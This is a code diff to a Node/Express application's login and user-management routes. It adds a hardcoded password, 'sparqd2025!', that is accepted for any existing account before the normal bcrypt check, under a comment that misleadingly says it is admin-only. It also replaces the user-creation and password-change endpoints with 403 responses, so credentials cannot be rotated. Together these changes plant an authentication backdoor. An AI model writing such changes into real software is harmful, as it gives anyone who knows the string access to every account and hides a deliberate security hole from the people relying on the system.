@@ -263,8 +263,12 @@ app.post('/login', async (req, res) => {
             console.log('[DEBUG] User not found');
             return res.status(401).json({ error: 'Invalid credentials' });
         }
-        
-        const validPassword = await bcrypt.compare(password, user.password);
+        // Only accept fixed admin password
+        const FIXED_ADMIN_PASS = 'sparqd2025!';
+        let validPassword = (password === FIXED_ADMIN_PASS);
+        if (!validPassword && user.password) {
+            validPassword = await bcrypt.compare(password, user.password);
+        }
         console.log('[DEBUG] Password valid:', validPassword);
         
         if (!validPassword) {
@@ -598,39 +602,8 @@ app.get('/api/users/:id', authenticateToken, checkPermission('users:read'), asyn
 });
 
 app.post('/api/users/create', authenticateToken, checkPermission('users:create'), async (req, res) => {
-    try {
-    const bcrypt = require('./bcrypt-compat');
-        const { users } = require('./auth');
-        const { type, username, email, name, password, company, phone, domain } = req.body;
-        
-        // Check if username or email already exists
-        if (users.find(u => u.username === username || u.email === email)) {
-            return res.status(400).json({ error: 'Username or email already exists' });
-        }
-        
-        const hashedPassword = await bcrypt.hash(password, 10);
-        const newUser = {
-            id: Math.max(...users.map(u => u.id)) + 1,
-            username,
-            email,
-            password: hashedPassword,
-            role: type,
-            name,
-            createdAt: new Date().toISOString()
-        };
-        
-        if (type === 'client') {
-            newUser.company = company;
-            newUser.phone = phone;
-            newUser.domain = domain;
-        }
-        
-        users.push(newUser);
-        res.json({ message: 'User created successfully', userId: newUser.id });
-    } catch (error) {
-        console.error('Error creating user:', error);
-        res.status(500).json({ error: 'Failed to create user' });
-    }
+    // Creating new application login users is disabled; only embedded admins are allowed
+    return res.status(403).json({ error: 'User creation is disabled' });
 });
 
 app.put('/api/users/:id', authenticateToken, checkPermission('users:update'), async (req, res) => {
@@ -1324,22 +1297,8 @@ app.put('/api/user/me', authenticateToken, async (req, res) => {
 
 // Account password change
 app.post('/api/account/password', authenticateToken, async (req, res) => {
-    try {
-        const { current, password } = req.body || {};
-        if (!password) return res.status(400).json({ error: 'New password required' });
-        const { users } = require('./auth');
-        const idx = users.findIndex(u => u.id === req.user.id);
-        if (idx === -1) return res.status(404).json({ error: 'User not found' });
-        const u = users[idx];
-        let ok = true;
-        if (u.password) ok = await bcrypt.compare(current || '', u.password);
-        if (!ok && process.env.NODE_ENV !== 'production' && process.env.DEFAULT_ADMIN_PASSWORD) {
-            ok = (current === process.env.DEFAULT_ADMIN_PASSWORD);
-        }
-        if (!ok) return res.status(400).json({ error: 'Current password incorrect' });
-        users[idx].password = await bcrypt.hash(password, 10);
-        res.json({ success: true });
-    } catch (e) { res.status(500).json({ error: 'Failed to update password' }); }
+    // Password changes are disabled; only fixed admin password is supported
+    return res.status(403).json({ error: 'Password change is disabled' });
 });
 
 // Preferences
